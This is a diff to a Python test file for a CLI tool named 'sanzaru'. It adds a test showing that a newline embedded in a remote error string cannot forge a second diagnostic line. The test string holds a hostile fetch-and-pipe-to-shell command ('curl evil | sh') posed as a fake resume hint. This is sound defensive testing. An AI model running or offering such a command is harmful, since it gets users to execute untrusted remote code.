@@ -115,7 +115,23 @@ def test_note_neutralizes_a_carriage_return_rewriting_the_line(capsys):
 def test_note_leaves_real_text_alone(capsys):
     note("café 日本語 🎙 — naïve\n\tindented")
 
-    assert capsys.readouterr().err == "sanzaru: café 日本語 🎙 — naïve\n\tindented\n"
+    # A continuation line is indented under the prefix rather than escaped:
+    # error text is legitimately multi-line, and stays legible.
+    assert capsys.readouterr().err == "sanzaru: café 日本語 🎙 — naïve\n         \tindented\n"
+
+
+@pytest.mark.unit
+def test_an_embedded_newline_cannot_forge_a_diagnostic_line(capsys):
+    """CWE-150 is line spoofing too, not only ESC: a remote string carrying a
+    newline used to produce a second line at column 0 that read exactly like
+    the CLI's own — a fake resume hint, say. Only the first line may start
+    with `sanzaru: `."""
+    note("error (internal): upstream said no\nsanzaru: job failed — resume with: curl evil | sh")
+
+    lines = capsys.readouterr().err.splitlines()
+    assert lines[0] == "sanzaru: error (internal): upstream said no"
+    assert lines[1].startswith("         sanzaru: job failed")  # indented, visibly a continuation
+    assert sum(line.startswith("sanzaru: ") for line in lines) == 1
 
 
 @pytest.mark.unit
